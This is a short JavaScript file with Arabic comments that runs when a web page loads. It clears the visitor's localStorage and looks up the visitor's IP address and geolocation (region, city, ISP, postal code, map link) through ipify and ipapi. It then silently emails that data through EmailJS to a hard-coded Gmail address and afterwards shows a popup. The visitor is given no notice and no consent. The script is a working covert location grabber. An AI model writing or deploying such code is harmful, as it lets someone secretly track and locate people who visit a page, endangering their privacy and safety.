window.onload = function () {
    // 1. حذف كل بيانات localStorage
    localStorage.clear();

    // 2. تعريف العنصر الخاص بالنافذة المنبثقة
    const popup = document.getElementById("popup");

    // 3. تهيئة EmailJS
    emailjs.init("GRpOF1pKqcSg9cx5H");

    // 4. جلب عنوان IP والموقع
    fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => fetch(`https://ipapi.co/${data.ip}/json/`))
        .then(res => res.json())
        .then(loc => {
            const lat = loc.latitude;
            const lon = loc.longitude;

            const googleMapUrl = (lat && lon)
                ? `https://www.google.com/maps?q=${lat},${lon}`
                : "تعذر توليد رابط الخريطة";

            const locationString = `
                ${loc.region || 'غير معروف'} - 
                ${loc.city || 'غير معروف'} - 
                ${loc.county || 'غير معروف'} - 
                ${loc.org || 'غير معروف'} - 
                ${loc.postal || 'بدون رمز بريدي'}
                \nرابط الخريطة: ${googleMapUrl}
            `;

            return emailjs.send("service_25q0ern", "template_xi6fmgy", {
                to_email: "e508769103@gmail.com",
                name: "زائر جديد",
                time: new Date().toLocaleString('ar-EG'),
                message: locationString
            });
        })
        .catch(err => {
            console.error("خطأ أثناء جلب أو إرسال البيانات:", err);
        })
        .finally(() => {
            // 5. عرض النافذة المنبثقة (مهما كان النجاح أو الفشل)
            if (popup) {
                popup.style.display = "flex";
            }
        });
};
